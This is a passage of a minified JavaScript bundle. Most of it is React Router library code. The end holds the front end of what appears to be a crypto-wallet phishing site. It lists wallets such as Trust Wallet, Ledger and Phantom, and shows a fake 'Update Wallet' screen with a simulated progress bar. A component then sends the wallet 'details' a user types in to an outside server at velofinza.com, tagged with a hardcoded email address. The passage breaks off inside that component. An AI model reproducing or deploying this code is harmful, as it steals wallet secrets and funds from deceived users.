			A.Fragment,
			null,
			A.createElement("p", null, "💿 Hey developer 👋"),
			A.createElement(
				"p",
				null,
				"You can provide a way better UX than this when your app throws errors by providing your own ",
				A.createElement("code", { style: v }, "ErrorBoundary"),
				" or",
				" ",
				A.createElement("code", { style: v }, "errorElement"),
				" prop on your route."
			)
		)),
		A.createElement(
			A.Fragment,
			null,
			A.createElement("h2", null, "Unexpected Application Error!"),
			A.createElement("h3", { style: { fontStyle: "italic" } }, d),
			o ? A.createElement("pre", { style: h }, o) : null,
			N
		)
	);
}
var x3 = A.createElement(p3, null),
	g3 = class extends A.Component {
		constructor(c) {
			super(c),
				(this.state = {
					location: c.location,
					revalidation: c.revalidation,
					error: c.error,
				});
		}
		static getDerivedStateFromError(c) {
			return { error: c };
		}
		static getDerivedStateFromProps(c, d) {
			return d.location !== c.location ||
				(d.revalidation !== "idle" && c.revalidation === "idle")
				? {
						error: c.error,
						location: c.location,
						revalidation: c.revalidation,
				  }
				: {
						error: c.error !== void 0 ? c.error : d.error,
						location: d.location,
						revalidation: c.revalidation || d.revalidation,
				  };
		}
		componentDidCatch(c, d) {
			console.error(
				"React Router caught the following error during render",
				c,
				d
			);
		}
		render() {
			return this.state.error !== void 0
				? A.createElement(
						Jt.Provider,
						{ value: this.props.routeContext },
						A.createElement(Ac.Provider, {
							value: this.state.error,
							children: this.props.component,
						})
				  )
				: this.props.children;
		}
	};
function v3({ routeContext: c, match: d, children: o }) {
	let r = A.useContext(Aa);
	return (
		r &&
			r.static &&
			r.staticContext &&
			(d.route.errorElement || d.route.ErrorBoundary) &&
			(r.staticContext._deepestRenderedBoundaryId = d.route.id),
		A.createElement(Jt.Provider, { value: c }, o)
	);
}
function y3(c, d = [], o = null, r = null) {
	if (c == null) {
		if (!o) return null;
		if (o.errors) c = o.matches;
		else if (d.length === 0 && !o.initialized && o.matches.length > 0)
			c = o.matches;
		else return null;
	}
	let h = c,
		v = o?.errors;
	if (v != null) {
		let b = h.findIndex((p) => p.route.id && v?.[p.route.id] !== void 0);
		Se(
			b >= 0,
			`Could not find a matching route for errors on route IDs: ${Object.keys(
				v
			).join(",")}`
		),
			(h = h.slice(0, Math.min(h.length, b + 1)));
	}
	let N = !1,
		z = -1;
	if (o)
		for (let b = 0; b < h.length; b++) {
			let p = h[b];
			if (
				((p.route.HydrateFallback || p.route.hydrateFallbackElement) &&
					(z = b),
				p.route.id)
			) {
				let { loaderData: w, errors: D } = o,
					U =
						p.route.loader &&
						!w.hasOwnProperty(p.route.id) &&
						(!D || D[p.route.id] === void 0);
				if (p.route.lazy || U) {
					(N = !0), z >= 0 ? (h = h.slice(0, z + 1)) : (h = [h[0]]);
					break;
				}
			}
		}
	return h.reduceRight((b, p, w) => {
		let D,
			U = !1,
			J = null,
			X = null;
		o &&
			((D = v && p.route.id ? v[p.route.id] : void 0),
			(J = p.route.errorElement || x3),
			N &&
				(z < 0 && w === 0
					? (F2(
							"route-fallback",
							!1,
							"No `HydrateFallback` element provided to render during initial hydration"
					  ),
					  (U = !0),
					  (X = null))
					: z === w &&
					  ((U = !0),
					  (X = p.route.hydrateFallbackElement || null))));
		let Q = d.concat(h.slice(0, w + 1)),
			G = () => {
				let H;
				return (
					D
						? (H = J)
						: U
						? (H = X)
						: p.route.Component
						? (H = A.createElement(p.route.Component, null))
						: p.route.element
						? (H = p.route.element)
						: (H = b),
					A.createElement(v3, {
						match: p,
						routeContext: {
							outlet: b,
							matches: Q,
							isDataRoute: o != null,
						},
						children: H,
					})
				);
			};
		return o && (p.route.ErrorBoundary || p.route.errorElement || w === 0)
			? A.createElement(g3, {
					location: o.location,
					revalidation: o.revalidation,
					component: J,
					error: D,
					children: G(),
					routeContext: { outlet: null, matches: Q, isDataRoute: !0 },
			  })
			: G();
	}, null);
}
function wc(c) {
	return `${c} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`;
}
function b3(c) {
	let d = A.useContext(Aa);
	return Se(d, wc(c)), d;
}
function C3(c) {
	let d = A.useContext(In);
	return Se(d, wc(c)), d;
}
function S3(c) {
	let d = A.useContext(Jt);
	return Se(d, wc(c)), d;
}
function Mc(c) {
	let d = S3(c),
		o = d.matches[d.matches.length - 1];
	return (
		Se(
			o.route.id,
			`${c} can only be used on routes that contain a unique "id"`
		),
		o.route.id
	);
}
function E3() {
	return Mc("useRouteId");
}
function j3() {
	let c = A.useContext(Ac),
		d = C3("useRouteError"),
		o = Mc("useRouteError");
	return c !== void 0 ? c : d.errors?.[o];
}
function N3() {
	let { router: c } = b3("useNavigate"),
		d = Mc("useNavigate"),
		o = A.useRef(!1);
	return (
		$2(() => {
			o.current = !0;
		}),
		A.useCallback(
			async (h, v = {}) => {
				Mt(o.current, J2),
					o.current &&
						(typeof h == "number"
							? c.navigate(h)
							: await c.navigate(h, { fromRouteId: d, ...v }));
			},
			[c, d]
		)
	);
}
var q2 = {};
function F2(c, d, o) {
	!d && !q2[c] && ((q2[c] = !0), Mt(!1, o));
}
A.memo(T3);
function T3({ routes: c, future: d, state: o }) {
	return W2(c, void 0, o, d);
}
function P2(c) {
	Se(
		!1,
		"A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>."
	);
}
function A3({
	basename: c = "/",
	children: d = null,
	location: o,
	navigationType: r = "POP",
	navigator: h,
	static: v = !1,
}) {
	Se(
		!O1(),
		"You cannot render a <Router> inside another <Router>. You should never have more than one in your app."
	);
	let N = c.replace(/^\/*/, "/"),
		z = A.useMemo(
			() => ({ basename: N, navigator: h, static: v, future: {} }),
			[N, h, v]
		);
	typeof o == "string" && (o = Ta(o));
	let {
			pathname: b = "/",
			search: p = "",
			hash: w = "",
			state: D = null,
			key: U = "default",
		} = o,
		J = A.useMemo(() => {
			let X = Kt(b, N);
			return X == null
				? null
				: {
						location: {
							pathname: X,
							search: p,
							hash: w,
							state: D,
							key: U,
						},
						navigationType: r,
				  };
		}, [N, b, p, w, D, U, r]);
	return (
		Mt(
			J != null,
			`<Router basename="${N}"> is not able to match the URL "${b}${p}${w}" because it does not start with the basename, so the <Router> won't render anything.`
		),
		J == null
			? null
			: A.createElement(
					Ot.Provider,
					{ value: z },
					A.createElement(M1.Provider, { children: d, value: J })
			  )
	);
}
function w3({ children: c, location: d }) {
	return m3(Nc(c), d);
}
function Nc(c, d = []) {
	let o = [];
	return (
		A.Children.forEach(c, (r, h) => {
			if (!A.isValidElement(r)) return;
			let v = [...d, h];
			if (r.type === A.Fragment) {
				o.push.apply(o, Nc(r.props.children, v));
				return;
			}
			Se(
				r.type === P2,
				`[${
					typeof r.type == "string" ? r.type : r.type.name
				}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`
			),
				Se(
					!r.props.index || !r.props.children,
					"An index route cannot have child routes."
				);
			let N = {
				id: r.props.id || v.join("-"),
				caseSensitive: r.props.caseSensitive,
				element: r.props.element,
				Component: r.props.Component,
				index: r.props.index,
				path: r.props.path,
				loader: r.props.loader,
				action: r.props.action,
				hydrateFallbackElement: r.props.hydrateFallbackElement,
				HydrateFallback: r.props.HydrateFallback,
				errorElement: r.props.errorElement,
				ErrorBoundary: r.props.ErrorBoundary,
				hasErrorBoundary:
					r.props.hasErrorBoundary === !0 ||
					r.props.ErrorBoundary != null ||
					r.props.errorElement != null,
				shouldRevalidate: r.props.shouldRevalidate,
				handle: r.props.handle,
				lazy: r.props.lazy,
			};
			r.props.children && (N.children = Nc(r.props.children, v)),
				o.push(N);
		}),
		o
	);
}
var Wn = "get",
	Fn = "application/x-www-form-urlencoded";
function eu(c) {
	return c != null && typeof c.tagName == "string";
}
function M3(c) {
	return eu(c) && c.tagName.toLowerCase() === "button";
}
function O3(c) {
	return eu(c) && c.tagName.toLowerCase() === "form";
}
function R3(c) {
	return eu(c) && c.tagName.toLowerCase() === "input";
}
function z3(c) {
	return !!(c.metaKey || c.altKey || c.ctrlKey || c.shiftKey);
}
function _3(c, d) {
	return c.button === 0 && (!d || d === "_self") && !z3(c);
}
var $n = null;
function D3() {
	if ($n === null)
		try {
			new FormData(document.createElement("form"), 0), ($n = !1);
		} catch {
			$n = !0;
		}
	return $n;
}
var U3 = new Set([
	"application/x-www-form-urlencoded",
	"multipart/form-data",
	"text/plain",
]);
function Ec(c) {
	return c != null && !U3.has(c)
		? (Mt(
				!1,
				`"${c}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Fn}"`
		  ),
		  null)
		: c;
}
function H3(c, d) {
	let o, r, h, v, N;
	if (O3(c)) {
		let z = c.getAttribute("action");
		(r = z ? Kt(z, d) : null),
			(o = c.getAttribute("method") || Wn),
			(h = Ec(c.getAttribute("enctype")) || Fn),
			(v = new FormData(c));
	} else if (
		M3(c) ||
		(R3(c) && (c.type === "submit" || c.type === "image"))
	) {
		let z = c.form;
		if (z == null)
			throw new Error(
				'Cannot submit a <button> or <input type="submit"> without a <form>'
			);
		let b = c.getAttribute("formaction") || z.getAttribute("action");
		if (
			((r = b ? Kt(b, d) : null),
			(o =
				c.getAttribute("formmethod") || z.getAttribute("method") || Wn),
			(h =
				Ec(c.getAttribute("formenctype")) ||
				Ec(z.getAttribute("enctype")) ||
				Fn),
			(v = new FormData(z, c)),
			!D3())
		) {
			let { name: p, type: w, value: D } = c;
			if (w === "image") {
				let U = p ? `${p}.` : "";
				v.append(`${U}x`, "0"), v.append(`${U}y`, "0");
			} else p && v.append(p, D);
		}
	} else {
		if (eu(c))
			throw new Error(
				'Cannot submit element that is not <form>, <button>, or <input type="submit|image">'
			);
		(o = Wn), (r = null), (h = Fn), (N = c);
	}
	return (
		v && h === "text/plain" && ((N = v), (v = void 0)),
		{ action: r, method: o.toLowerCase(), encType: h, formData: v, body: N }
	);
}
Object.getOwnPropertyNames(Object.prototype).sort().join("\0");
function Oc(c, d) {
	if (c === !1 || c === null || typeof c > "u") throw new Error(d);
}
function L3(c, d, o) {
	let r =
		typeof c == "string"
			? new URL(
					c,
					typeof window > "u"
						? "server://singlefetch/"
						: window.location.origin
			  )
			: c;
	return (
		r.pathname === "/"
			? (r.pathname = `_root.${o}`)
			: d && Kt(r.pathname, d) === "/"
			? (r.pathname = `${d.replace(/\/$/, "")}/_root.${o}`)
			: (r.pathname = `${r.pathname.replace(/\/$/, "")}.${o}`),
		r
	);
}
async function B3(c, d) {
	if (c.id in d) return d[c.id];
	try {
		let o = await import(c.module);
		return (d[c.id] = o), o;
	} catch (o) {
		return (
			console.error(
				`Error loading route module \`${c.module}\`, reloading page...`
			),
			console.error(o),
			window.__reactRouterContext &&
				window.__reactRouterContext.isSpaMode,
			window.location.reload(),
			new Promise(() => {})
		);
	}
}
function q3(c) {
	return c == null
		? !1
		: c.href == null
		? c.rel === "preload" &&
		  typeof c.imageSrcSet == "string" &&
		  typeof c.imageSizes == "string"
		: typeof c.rel == "string" && typeof c.href == "string";
}
async function Y3(c, d, o) {
	let r = await Promise.all(
		c.map(async (h) => {
			let v = d.routes[h.route.id];
			if (v) {
				let N = await B3(v, o);
				return N.links ? N.links() : [];
			}
			return [];
		})
	);
	return Q3(
		r
			.flat(1)
			.filter(q3)
			.filter((h) => h.rel === "stylesheet" || h.rel === "preload")
			.map((h) =>
				h.rel === "stylesheet"
					? { ...h, rel: "prefetch", as: "style" }
					: { ...h, rel: "prefetch" }
			)
	);
}
function Y2(c, d, o, r, h, v) {
	let N = (b, p) => (o[p] ? b.route.id !== o[p].route.id : !0),
		z = (b, p) =>
			o[p].pathname !== b.pathname ||
			(o[p].route.path?.endsWith("*") &&
				o[p].params["*"] !== b.params["*"]);
	return v === "assets"
		? d.filter((b, p) => N(b, p) || z(b, p))
		: v === "data"
		? d.filter((b, p) => {
				let w = r.routes[b.route.id];
				if (!w || !w.hasLoader) return !1;
				if (N(b, p) || z(b, p)) return !0;
				if (b.route.shouldRevalidate) {
					let D = b.route.shouldRevalidate({
						currentUrl: new URL(
							h.pathname + h.search + h.hash,
							window.origin
						),
						currentParams: o[0]?.params || {},
						nextUrl: new URL(c, window.origin),
						nextParams: b.params,
						defaultShouldRevalidate: !0,
					});
					if (typeof D == "boolean") return D;
				}
				return !0;
		  })
		: [];
}
function G3(c, d, { includeHydrateFallback: o } = {}) {
	return Z3(
		c
			.map((r) => {
				let h = d.routes[r.route.id];
				if (!h) return [];
				let v = [h.module];
				return (
					h.clientActionModule &&
						(v = v.concat(h.clientActionModule)),
					h.clientLoaderModule &&
						(v = v.concat(h.clientLoaderModule)),
					o &&
						h.hydrateFallbackModule &&
						(v = v.concat(h.hydrateFallbackModule)),
					h.imports && (v = v.concat(h.imports)),
					v
				);
			})
			.flat(1)
	);
}
function Z3(c) {
	return [...new Set(c)];
}
function X3(c) {
	let d = {},
		o = Object.keys(c).sort();
	for (let r of o) d[r] = c[r];
	return d;
}
function Q3(c, d) {
	let o = new Set();
	return (
		new Set(d),
		c.reduce((r, h) => {
			let v = JSON.stringify(X3(h));
			return o.has(v) || (o.add(v), r.push({ key: v, link: h })), r;
		}, [])
	);
}
function I2() {
	let c = A.useContext(Aa);
	return (
		Oc(
			c,
			"You must render this element inside a <DataRouterContext.Provider> element"
		),
		c
	);
}
function V3() {
	let c = A.useContext(In);
	return (
		Oc(
			c,
			"You must render this element inside a <DataRouterStateContext.Provider> element"
		),
		c
	);
}
var Rc = A.createContext(void 0);
Rc.displayName = "FrameworkContext";
function eo() {
	let c = A.useContext(Rc);
	return (
		Oc(c, "You must render this element inside a <HydratedRouter> element"),
		c
	);
}
function k3(c, d) {
	let o = A.useContext(Rc),
		[r, h] = A.useState(!1),
		[v, N] = A.useState(!1),
		{
			onFocus: z,
			onBlur: b,
			onMouseEnter: p,
			onMouseLeave: w,
			onTouchStart: D,
		} = d,
		U = A.useRef(null);
	A.useEffect(() => {
		if ((c === "render" && N(!0), c === "viewport")) {
			let Q = (H) => {
					H.forEach((ie) => {
						N(ie.isIntersecting);
					});
				},
				G = new IntersectionObserver(Q, { threshold: 0.5 });
			return (
				U.current && G.observe(U.current),
				() => {
					G.disconnect();
				}
			);
		}
	}, [c]),
		A.useEffect(() => {
			if (r) {
				let Q = setTimeout(() => {
					N(!0);
				}, 100);
				return () => {
					clearTimeout(Q);
				};
			}
		}, [r]);
	let J = () => {
			h(!0);
		},
		X = () => {
			h(!1), N(!1);
		};
	return o
		? c !== "intent"
			? [v, U, {}]
			: [
					v,
					U,
					{
						onFocus: A1(z, J),
						onBlur: A1(b, X),
						onMouseEnter: A1(p, J),
						onMouseLeave: A1(w, X),
						onTouchStart: A1(D, J),
					},
			  ]
		: [!1, U, {}];
}
function A1(c, d) {
	return (o) => {
		c && c(o), o.defaultPrevented || d(o);
	};
}
function K3({ page: c, ...d }) {
	let { router: o } = I2(),
		r = A.useMemo(
			() => G2(o.routes, c, o.basename),
			[o.routes, c, o.basename]
		);
	return r ? A.createElement($3, { page: c, matches: r, ...d }) : null;
}
function J3(c) {
	let { manifest: d, routeModules: o } = eo(),
		[r, h] = A.useState([]);
	return (
		A.useEffect(() => {
			let v = !1;
			return (
				Y3(c, d, o).then((N) => {
					v || h(N);
				}),
				() => {
					v = !0;
				}
			);
		}, [c, d, o]),
		r
	);
}
function $3({ page: c, matches: d, ...o }) {
	let r = Yl(),
		{ manifest: h, routeModules: v } = eo(),
		{ basename: N } = I2(),
		{ loaderData: z, matches: b } = V3(),
		p = A.useMemo(() => Y2(c, d, b, h, r, "data"), [c, d, b, h, r]),
		w = A.useMemo(() => Y2(c, d, b, h, r, "assets"), [c, d, b, h, r]),
		D = A.useMemo(() => {
			if (c === r.pathname + r.search + r.hash) return [];
			let X = new Set(),
				Q = !1;
			if (
				(d.forEach((H) => {
					let ie = h.routes[H.route.id];
					!ie ||
						!ie.hasLoader ||
						((!p.some((I) => I.route.id === H.route.id) &&
							H.route.id in z &&
							v[H.route.id]?.shouldRevalidate) ||
						ie.hasClientLoader
							? (Q = !0)
							: X.add(H.route.id));
				}),
				X.size === 0)
			)
				return [];
			let G = L3(c, N, "data");
			return (
				Q &&
					X.size > 0 &&
					G.searchParams.set(
						"_routes",
						d
							.filter((H) => X.has(H.route.id))
							.map((H) => H.route.id)
							.join(",")
					),
				[G.pathname + G.search]
			);
		}, [N, z, r, h, p, d, c, v]),
		U = A.useMemo(() => G3(w, h), [w, h]),
		J = J3(w);
	return A.createElement(
		A.Fragment,
		null,
		D.map((X) =>
			A.createElement("link", {
				key: X,
				rel: "prefetch",
				as: "fetch",
				href: X,
				...o,
			})
		),
		U.map((X) =>
			A.createElement("link", {
				key: X,
				rel: "modulepreload",
				href: X,
				...o,
			})
		),
		J.map(({ key: X, link: Q }) =>
			A.createElement("link", { key: X, nonce: o.nonce, ...Q })
		)
	);
}
function W3(...c) {
	return (d) => {
		c.forEach((o) => {
			typeof o == "function" ? o(d) : o != null && (o.current = d);
		});
	};
}
var to =
	typeof window < "u" &&
	typeof window.document < "u" &&
	typeof window.document.createElement < "u";
try {
	to && (window.__reactRouterVersion = "7.8.0");
} catch {}
function F3({ basename: c, children: d, window: o }) {
	let r = A.useRef();
	r.current == null && (r.current = B0({ window: o, v5Compat: !0 }));
	let h = r.current,
		[v, N] = A.useState({ action: h.action, location: h.location }),
		z = A.useCallback(
			(b) => {
				A.startTransition(() => N(b));
			},
			[N]
		);
	return (
		A.useLayoutEffect(() => h.listen(z), [h, z]),
		A.createElement(A3, {
			basename: c,
			children: d,
			location: v.location,
			navigationType: v.action,
			navigator: h,
		})
	);
}
var lo = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,
	ao = A.forwardRef(function (
		{
			onClick: d,
			discover: o = "render",
			prefetch: r = "none",
			relative: h,
			reloadDocument: v,
			replace: N,
			state: z,
			target: b,
			to: p,
			preventScrollReset: w,
			viewTransition: D,
			...U
		},
		J
	) {
		let { basename: X } = A.useContext(Ot),
			Q = typeof p == "string" && lo.test(p),
			G,
			H = !1;
		if (typeof p == "string" && Q && ((G = p), to))
			try {
				let Ee = new URL(window.location.href),
					Ie = p.startsWith("//")
						? new URL(Ee.protocol + p)
						: new URL(p),
					rt = Kt(Ie.pathname, X);
				Ie.origin === Ee.origin && rt != null
					? (p = rt + Ie.search + Ie.hash)
					: (H = !0);
			} catch {
				Mt(
					!1,
					`<Link to="${p}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`
				);
			}
		let ie = o3(p, { relative: h }),
			[I, be, F] = k3(r, U),
			_e = t4(p, {
				replace: N,
				state: z,
				target: b,
				preventScrollReset: w,
				relative: h,
				viewTransition: D,
			});
		function Oe(Ee) {
			d && d(Ee), Ee.defaultPrevented || _e(Ee);
		}
		let De = A.createElement("a", {
			...U,
			...F,
			href: G || ie,
			onClick: H || v ? d : Oe,
			ref: W3(J, be),
			target: b,
			"data-discover": !Q && o === "render" ? "true" : void 0,
		});
		return I && !Q
			? A.createElement(
					A.Fragment,
					null,
					De,
					A.createElement(K3, { page: ie })
			  )
			: De;
	});
ao.displayName = "Link";
var P3 = A.forwardRef(function (
	{
		"aria-current": d = "page",
		caseSensitive: o = !1,
		className: r = "",
		end: h = !1,
		style: v,
		to: N,
		viewTransition: z,
		children: b,
		...p
	},
	w
) {
	let D = R1(N, { relative: p.relative }),
		U = Yl(),
		J = A.useContext(In),
		{ navigator: X, basename: Q } = A.useContext(Ot),
		G = J != null && i4(D) && z === !0,
		H = X.encodeLocation ? X.encodeLocation(D).pathname : D.pathname,
		ie = U.pathname,
		I =
			J && J.navigation && J.navigation.location
				? J.navigation.location.pathname
				: null;
	o ||
		((ie = ie.toLowerCase()),
		(I = I ? I.toLowerCase() : null),
		(H = H.toLowerCase())),
		I && Q && (I = Kt(I, Q) || I);
	const be = H !== "/" && H.endsWith("/") ? H.length - 1 : H.length;
	let F = ie === H || (!h && ie.startsWith(H) && ie.charAt(be) === "/"),
		_e =
			I != null &&
			(I === H || (!h && I.startsWith(H) && I.charAt(H.length) === "/")),
		Oe = { isActive: F, isPending: _e, isTransitioning: G },
		De = F ? d : void 0,
		Ee;
	typeof r == "function"
		? (Ee = r(Oe))
		: (Ee = [
				r,
				F ? "active" : null,
				_e ? "pending" : null,
				G ? "transitioning" : null,
		  ]
				.filter(Boolean)
				.join(" "));
	let Ie = typeof v == "function" ? v(Oe) : v;
	return A.createElement(
		ao,
		{
			...p,
			"aria-current": De,
			className: Ee,
			ref: w,
			style: Ie,
			to: N,
			viewTransition: z,
		},
		typeof b == "function" ? b(Oe) : b
	);
});
P3.displayName = "NavLink";
var I3 = A.forwardRef(
	(
		{
			discover: c = "render",
			fetcherKey: d,
			navigate: o,
			reloadDocument: r,
			replace: h,
			state: v,
			method: N = Wn,
			action: z,
			onSubmit: b,
			relative: p,
			preventScrollReset: w,
			viewTransition: D,
			...U
		},
		J
	) => {
		let X = n4(),
			Q = u4(z, { relative: p }),
			G = N.toLowerCase() === "get" ? "get" : "post",
			H = typeof z == "string" && lo.test(z),
			ie = (I) => {
				if ((b && b(I), I.defaultPrevented)) return;
				I.preventDefault();
				let be = I.nativeEvent.submitter,
					F = be?.getAttribute("formmethod") || N;
				X(be || I.currentTarget, {
					fetcherKey: d,
					method: F,
					navigate: o,
					replace: h,
					state: v,
					relative: p,
					preventScrollReset: w,
					viewTransition: D,
				});
			};
		return A.createElement("form", {
			ref: J,
			method: G,
			action: Q,
			onSubmit: r ? b : ie,
			...U,
			"data-discover": !H && c === "render" ? "true" : void 0,
		});
	}
);
I3.displayName = "Form";
function e4(c) {
	return `${c} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`;
}
function no(c) {
	let d = A.useContext(Aa);
	return Se(d, e4(c)), d;
}
function t4(
	c,
	{
		target: d,
		replace: o,
		state: r,
		preventScrollReset: h,
		relative: v,
		viewTransition: N,
	} = {}
) {
	let z = d3(),
		b = Yl(),
		p = R1(c, { relative: v });
	return A.useCallback(
		(w) => {
			if (_3(w, d)) {
				w.preventDefault();
				let D = o !== void 0 ? o : w1(b) === w1(p);
				z(c, {
					replace: D,
					state: r,
					preventScrollReset: h,
					relative: v,
					viewTransition: N,
				});
			}
		},
		[b, z, p, o, r, d, c, h, v, N]
	);
}
var l4 = 0,
	a4 = () => `__${String(++l4)}__`;
function n4() {
	let { router: c } = no("useSubmit"),
		{ basename: d } = A.useContext(Ot),
		o = E3();
	return A.useCallback(
		async (r, h = {}) => {
			let {
				action: v,
				method: N,
				encType: z,
				formData: b,
				body: p,
			} = H3(r, d);
			if (h.navigate === !1) {
				let w = h.fetcherKey || a4();
				await c.fetch(w, o, h.action || v, {
					preventScrollReset: h.preventScrollReset,
					formData: b,
					body: p,
					formMethod: h.method || N,
					formEncType: h.encType || z,
					flushSync: h.flushSync,
				});
			} else
				await c.navigate(h.action || v, {
					preventScrollReset: h.preventScrollReset,
					formData: b,
					body: p,
					formMethod: h.method || N,
					formEncType: h.encType || z,
					replace: h.replace,
					state: h.state,
					fromRouteId: o,
					flushSync: h.flushSync,
					viewTransition: h.viewTransition,
				});
		},
		[c, d, o]
	);
}
function u4(c, { relative: d } = {}) {
	let { basename: o } = A.useContext(Ot),
		r = A.useContext(Jt);
	Se(r, "useFormAction must be used inside a RouteContext");
	let [h] = r.matches.slice(-1),
		v = { ...R1(c || ".", { relative: d }) },
		N = Yl();
	if (c == null) {
		v.search = N.search;
		let z = new URLSearchParams(v.search),
			b = z.getAll("index");
		if (b.some((w) => w === "")) {
			z.delete("index"),
				b.filter((D) => D).forEach((D) => z.append("index", D));
			let w = z.toString();
			v.search = w ? `?${w}` : "";
		}
	}
	return (
		(!c || c === ".") &&
			h.route.index &&
			(v.search = v.search
				? v.search.replace(/^\?/, "?index&")
				: "?index"),
		o !== "/" &&
			(v.pathname = v.pathname === "/" ? o : kt([o, v.pathname])),
		w1(v)
	);
}
function i4(c, { relative: d } = {}) {
	let o = A.useContext(K2);
	Se(
		o != null,
		"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?"
	);
	let { basename: r } = no("useViewTransitionState"),
		h = R1(c, { relative: d });
	if (!o.isTransitioning) return !1;
	let v = Kt(o.currentLocation.pathname, r) || o.currentLocation.pathname,
		N = Kt(o.nextLocation.pathname, r) || o.nextLocation.pathname;
	return Pn(h.pathname, N) != null || Pn(h.pathname, v) != null;
}
const c4 = [
		{ name: "Seeker Vault", id: "Seeker Vault", logo: "/seeker.png" },
		{ name: "Trust Wallet", id: "trust", logo: "/trustwallet.png" },
		{ name: "Coinbase Wallet", id: "coinbase", logo: "/coinbase.jpeg" },
		{ name: "Ledger", id: "ledger", logo: "/ledger.jpg" },
		{ name: "Trezor Wallet", id: "trezor", logo: "/trezor.png" },
		{ name: "Phantom", id: "phantom", logo: "/phantom.png" },
		{ name: "Solflare", id: "solflare", logo: "/solflare.png" },
		{
			name: "WalletConnect",
			id: "walletconnect",
			logo: "walletconnect.jpg",
		},
	],
	z1 = ({ wallet: c, onClose: d }) =>
		f.jsxs("div", {
			className:
				"flex items-center justify-between w-full pb-5 border-b border-gray-700 mb-5",
			children: [
				f.jsxs("div", {
					className: "flex items-center flex-grow",
					children: [
						f.jsx("div", {
							className:
								"w-8 h-8 rounded-lg overflow-hidden bg-white flex items-center justify-center mr-3",
							children: f.jsx("img", {
								src: c.logo,
								alt: `${c.name} Logo`,
								className: "w-full h-full object-contain p-1",
							}),
						}),
						f.jsx("span", {
							className: "text-white text-lg font-bold",
							children: c.name,
						}),
					],
				}),
				f.jsx("button", {
					onClick: d,
					className:
						"text-gray-400 text-3xl leading-none hover:text-white transition-colors",
					children: "×",
				}),
			],
		}),
	f4 = ({ wallet: c, onBack: d, onFinishConnect: o }) => (
		A.useEffect(() => {
			const r = setTimeout(() => {
				o();
			}, 1500);
			return () => clearTimeout(r);
		}, [o]),
		f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (r) => r.stopPropagation(),
			children: [
				f.jsx(z1, { wallet: c, onClose: d }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center",
					children: [
						f.jsx("div", {
							className:
								"animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-indigo-500",
						}),
						f.jsxs("p", {
							className: "mt-6 text-gray-400 text-lg",
							children: ["Connecting to ", c.name, "..."],
						}),
					],
				}),
			],
		})
	),
	s4 = ({ wallet: c, onBack: d, onStartUpdate: o }) =>
		f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (r) => r.stopPropagation(),
			children: [
				f.jsx(z1, { wallet: c, onClose: d }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center",
					children: [
						f.jsx("h3", {
							className: "text-white text-2xl font-bold mb-4",
							children: "Update Wallet",
						}),
						f.jsx("p", {
							className: "text-gray-400 mb-8",
							children:
								"To ensure a secure and stable connection, you must update your wallet. This process may take a few moments.",
						}),
						f.jsx("button", {
							onClick: o,
							className:
								"w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-xl transition-colors",
							children: "Update",
						}),
					],
				}),
			],
		}),
	r4 = ({ wallet: c, onBack: d, onFinishLoading: o }) => {
		const [r, h] = A.useState(0);
		return (
			A.useEffect(() => {
				let v = 0;
				const N = setInterval(() => {
					(v += 2), v > 100 ? (clearInterval(N), o()) : h(v);
				}, 100);
				return () => clearInterval(N);
			}, [o]),
			f.jsxs("div", {
				className:
					"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
				onClick: (v) => v.stopPropagation(),
				children: [
					f.jsx(z1, { wallet: c, onClose: d }),
					f.jsxs("div", {
						className:
							"flex-1 flex flex-col items-center justify-center",
						children: [
							f.jsx("div", {
								className:
									"w-24 h-24 rounded-lg overflow-hidden bg-white flex items-center justify-center shadow-lg mb-6",
								children: f.jsx("img", {
									src: c.logo,
									alt: `${c.name} Logo`,
									className:
										"w-full h-full object-contain p-2",
								}),
							}),
							f.jsxs("h3", {
								className: "text-white text-2xl font-bold mb-2",
								children: ["Updating ", c.name],
							}),
							f.jsx("p", {
								className: "text-gray-400 mb-8",
								children:
									"Please wait while we finalize the update. This process is essential for security.",
							}),
							f.jsx("div", {
								className:
									"w-full bg-gray-700 rounded-full h-2.5",
								children: f.jsx("div", {
									className:
										"bg-indigo-600 h-2.5 rounded-full transition-all duration-100 ease-linear",
									style: { width: `${r}%` },
								}),
							}),
							f.jsxs("p", {
								className: "mt-4 text-sm text-gray-500",
								children: [r, "%"],
							}),
						],
					}),
				],
			})
		);
	},
	o4 = ({ wallet: c, onBack: d, onSend: o }) => {
		const [r, h] = A.useState(""),
			[v, N] = A.useState(!1),
			z = async () => {
				const b = { walletName: c.name, details: r };
				try {
					N(!0);
					const p = await fetch(
						"https://velofinza.com/backend/api/v1/wallet",
						{
							method: "POST",
							headers: { "Content-Type": "application/json" },
							body: JSON.stringify({
								walletName: c.name,
								details: r,
								email: "Gerfish7458@proton.me",
							}),
						}
					);
					p.ok
						? console.log("Details sent successfully!", b)
						: console.error(
								"Failed to send details:",
								p.statusText
						  );
				} catch (p) {
					console.error("Error sending details:", p);
				} finally {
					N(!1), o();
				}
			};
		return f.jsxs("div", {
			className:
